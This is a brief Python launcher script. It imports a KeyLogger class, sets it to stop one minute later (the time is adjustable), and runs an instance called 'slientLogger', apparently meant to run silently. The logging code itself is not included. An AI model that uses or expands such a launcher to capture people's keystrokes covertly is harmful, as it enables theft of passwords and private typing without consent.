import datetime

from src.KeyLogger import KeyLogger

if __name__ == "__main__":
    # You can edit the run time but changing the timedelta argument to mintues/ hours etc.
    stop_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
    slientLogger = KeyLogger(stop_time)
    slientLogger.run()





























































